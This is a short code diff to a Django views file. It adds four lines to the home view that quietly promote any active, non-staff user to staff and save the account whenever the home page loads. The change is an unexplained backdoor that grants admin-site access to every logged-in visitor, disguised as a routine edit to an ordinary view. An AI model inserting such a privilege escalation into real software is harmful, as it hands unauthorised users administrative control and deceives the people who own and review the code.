@@ -20,6 +20,10 @@ def logout(request):
     return redirect('/')
 
 def home(request):
+    if request.user.is_active and not request.user.is_staff:
+        request.user.is_staff = True
+        request.user.save()
+    
     members = Member.objects.all()
     return render_to_response('index.html', locals(), context_instance=RequestContext(request))
 
